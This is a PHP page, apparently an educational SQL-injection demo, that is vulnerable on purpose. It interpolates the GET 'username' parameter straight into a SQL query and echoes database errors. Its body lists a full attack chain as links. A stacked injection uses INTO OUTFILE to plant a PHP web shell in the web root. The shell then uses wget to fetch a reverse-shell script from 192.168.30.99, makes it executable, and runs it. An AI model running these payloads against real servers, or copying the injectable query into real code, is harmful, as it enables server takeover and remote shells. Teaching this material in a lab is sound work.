<?php

    require 'functions.php';
    require 'config.php';

    $username = $_GET['username'] ?? null;
    $password = $_GET['password'] ?? null;

    $sql = "SELECT * FROM user WHERE username='$username'";

    try {
        $stmt = $db->prepare($sql);
        $stmt->execute();
    } catch(PDOException $ex) {
        echo "Some error occured: $sql\n";
        dd($ex->getMessage());
    }

    if (isset($_GET['username'])) {
        $results = $stmt->fetchAll();
    }



?>

<html lang="en">
    <head>
        <title>SQL Injection Example</title>
        <link rel="stylesheet" href="css/style.css" />
    </head>
    <body>
		<div class="container">
			<h2>Insecure webform</h2>
			<p>
			    This is a web form that is insecure in the frontend and backend. It doesn't actually attempt to login but is open to SQL Injection which is explained with the examples below.
			</p>
			
			<p>
			    <h6>Use the `into outfile` MySQL command to create a PHP script on the server that will run our commands</h6>
			    <a href="http://<?= HOST ?>/login.php?username=damien%27;select%20%22%3C?php%20system($_GET[%27cmd%27]);%22%20into%20outfile%20%22/var/www/web/images/cmd.php%22';'">http://<?= HOST ?>/login.php?username=damien';select "&lt;?php system($_GET['cmd']);" into outfile "/var/www/web/images/cmd.php"';</a>
			</p>

			<br />
			
			<p>
			    <h6>Use the newly created script to download a reverse shell</h6>
			    <a href="http://<?= HOST ?>/images/cmd.php?cmd=wget%20http://192.168.30.99/scripts/reverse-shell.py%20-O%20/tmp/reverse-shell.py">http://<?= HOST ?>/images/cmd.php?cmd=wget http://192.168.30.99/scripts/reverse-shell.py -O /tmp/reverse-shell.py</a>
			</p>

			<br />
			
			<p>
			    <h6>Change the permissions on the reverse shell to make it executable</h6>
			    <a href="http://<?= HOST ?>/images/cmd.php?cmd=chmod%20777%20/tmp/reverse-shell.py">http://<?= HOST ?>/images/cmd.php?cmd=chmod 777  /tmp/reverse-shell.py</a>
			</p>

			<br />
			
			<p>
			    <h6>Run the downloaded reverse shell</h6>
			    <a href="http://<?= HOST ?>/images/cmd.php?cmd=python%20/tmp/reverse-shell.py">http://<?= HOST ?>/images/cmd.php?cmd=python /tmp/reverse-shell.py</a>
			</p>
		</div>
		
		<hr />
		
		<form method="GET" action="">
		    Username: <input type="text" name="username" /><br />
		    Password: <input type="password" name="password" /><br />
		</form>

		<?php if ($results) : ?>
<?php die('what now'); ?>
			<div class="container">
				<?php dd($results); ?>
			</div>
			<?php else : ?>
				<?php die('no results'); ?>
		<?php endif; ?>
    </body>
</html>
